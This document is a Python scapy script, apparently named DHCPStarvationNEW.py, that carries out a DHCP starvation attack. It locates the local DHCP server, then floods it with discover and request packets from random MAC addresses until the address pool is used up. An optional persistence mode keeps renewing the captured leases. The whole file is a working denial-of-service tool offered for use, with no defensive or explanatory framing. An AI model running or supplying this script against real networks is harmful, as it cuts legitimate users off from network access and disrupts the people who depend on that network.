import argparse
import subprocess
import threading
import time
import random
from scapy.all import conf, Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, sniff, ARP, srp

lease = {}
def get_dhcp_server_ip(iface):
    pkt = (
        Ether(dst="FF:FF:FF:FF:FF:FF") /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=RandMAC()) /
        DHCP(options=[('message-type', 'discover'), 'end'])
    )

    sendp(pkt, iface=iface, verbose=0)
    pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)[0]
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2:
        return pkt[IP].src
    return None

def renew_leases(iface, target_ip):
    while True:
        global lease
        for ip, (mac,server_mac) in lease.copy().items():
            xid = random.randint(1, 2**32 - 1)
            print(f"Renewing {ip}/{mac} >>> MAC: {server_mac}")
            pkt_renew = (
                Ether(src=mac, dst=server_mac) /
                IP(src=ip, dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(ciaddr=ip, chaddr=mac, xid=xid) /
                DHCP(options=[('message-type', 'request'), 'end'])
            )
            sendp(pkt_renew, iface=iface, verbose=0)
        time.sleep(60)

def attack_dhcp_server(iface, target_ip, persistence=False): 
    global lease
    print(f"Starting DHCP Starvation Attack on {target_ip} ...")
    if persistence:
        print("--- Persistence Mode ENABLED ---")
        t = threading.Thread(target=renew_leases, args=(iface, target_ip))
        t.daemon = True
        t.start()

    while True:
        mac = RandMAC()
        xid = random.randint(1,2**32-1)
        
        pkt_discover = (
            Ether(src=mac , dst="FF:FF:FF:FF:FF:FF") /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac, xid=xid) /  
            DHCP(options=[('message-type', 'discover'), 'end'])
        )
        sendp(pkt_discover, iface=iface, verbose=0)
        
        offer_pkt = sniff(filter="udp and src port 67", count=1, iface=iface, timeout=5)
        if not offer_pkt:
            print("Server is Out of IP's !!!")
            time.sleep(10)
            continue
            
        ans = offer_pkt[0]
        server_mac = ans[Ether].src
        msg_type = None
        for opt in ans[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == 'message-type':
                msg_type = opt[1]
                break
        
        # If no offer - continue
        if msg_type != 2:
            continue

        offered_ip = ans[BOOTP].yiaddr
        print(f"Got IP: {offered_ip} for MAC: {mac}")
        lease[offered_ip] = (mac,server_mac)

        pkt_request = (
            Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac,xid=xid) /  
            DHCP(options=[
                ('message-type', 'request'),
                ('requested_addr', offered_ip),
                ('server_id', target_ip),
                'end'
            ])
        )
        sendp(pkt_request, iface=iface, verbose=0)

def main():
    
    argv_parser = argparse.ArgumentParser(
        prog='DHCPStarvationNEW.py',
        description='DHCP Starvation',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    
    argv_parser.add_argument(
        '-p', '--persist',
        help='Persistant Mode',   
        action='store_true', 
    )

    argv_parser.add_argument(
        '-i', '--iface',
        help='Interface you wish to use',
        required=False
    )
    argv_parser.add_argument(
        '-t', '--target',
        help='IP of target server',
        required=False
    )

    argv = argv_parser.parse_args()
    iface = argv.iface if argv.iface else conf.iface
    if not iface:
        print("Unable to get default interface")
        exit(0)

    print(f"Searching DHCP server's IP address for IFACE {iface} ...")
    tar_ip = argv.target if argv.target else get_dhcp_server_ip(iface)
    if not tar_ip:
        print("Unable to get DHCP server's IP address")
        exit(0)

    print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")
    
    attack_dhcp_server(iface, tar_ip, argv.persist)


main()